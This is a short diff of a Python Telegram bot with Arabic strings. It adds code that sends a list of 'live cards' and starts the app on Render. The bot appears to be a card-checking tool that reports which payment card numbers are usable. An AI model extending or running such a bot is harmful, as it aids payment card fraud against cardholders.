+    live_text = "🔥 **البطاقات الحية (LIVE):**\n\n"
+    for card in live_cards:
+        live_text += f"`{card}`\n"
+    
+    await message.reply(live_text)
 
-    # معالجات الأزرار تم تسجيلها بالفعل كـ @bot.callback_query_handler
-    print("✅ تم تسجيل معالجات التوليد التفاعلية بنجاح.")
-
-# تشغيل التسجيل عند استيراد الملف
-if bot:
-    register_handlers()
+# =================================================================
+# --- تشغيل البوت ---
+# =================================================================
+print("- Bot is running on Render...")
+app.run()
